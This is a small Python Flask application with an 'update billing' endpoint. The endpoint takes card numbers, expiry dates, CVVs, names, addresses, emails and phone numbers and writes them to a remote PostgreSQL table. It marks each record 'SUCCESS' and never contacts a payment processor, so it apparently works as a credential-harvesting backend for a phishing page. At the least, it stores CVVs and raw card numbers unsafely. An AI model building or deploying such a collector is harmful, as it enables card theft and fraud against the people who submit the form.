from flask import Flask, request, jsonify, render_template
import psycopg2
import os
import datetime


app = Flask(__name__, template_folder="templates")

# Connect to remote PostgreSQL
def get_db_connection():
    return psycopg2.connect(
        host=os.environ["DB_HOST"],
        port=os.environ["DB_PORT"],  # should be 6543
        database=os.environ["DB_NAME"],
        user=os.environ["DB_USER"],
        password=os.environ["DB_PASS"],
        sslmode="require"
    )

# Serve HTML form
@app.route("/", methods=["GET"])
def home():
    return render_template("billing.html")

# Validate and clean card info
def validate_card(card_number, exp_date, cvv):
    card_number = ''.join(filter(str.isdigit, card_number))
    if len(card_number) != 16:
        raise ValueError("Invalid card number")

    if '/' not in exp_date:
        raise ValueError("Invalid expiration date")
    month, year = exp_date.split('/')
    if not (month.isdigit() and year.isdigit()) or int(month) < 1 or int(month) > 12:
        raise ValueError("Invalid expiration month")

    cvv = ''.join(filter(str.isdigit, cvv))
    if len(cvv) not in [3, 4]:
        raise ValueError("Invalid CVV")

    return card_number, cvv

# API endpoint
@app.route("/api/update-billing", methods=["POST"])
def update_billing():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        # Clean and validate
        card_number, cvv = validate_card(
            data.get("cardNumber", ""),
            data.get("expDate", ""),
            data.get("cvv", "")
        )

        # Insert into database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO billing_records 
            (card_holder_name, card_number, card_type, exp_date, cvv, 
             status, billing_address, email, phone) 
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
        """, (
            data.get("cardHolderName"),
            card_number,
            data.get("cardType"),
            data.get("expDate"),
            cvv,
            'SUCCESS',
            data.get("billingAddress"),
            data.get("email"),
            data.get("phone")
        ))
        conn.commit()
        cur.close()
        conn.close()

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400
    

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
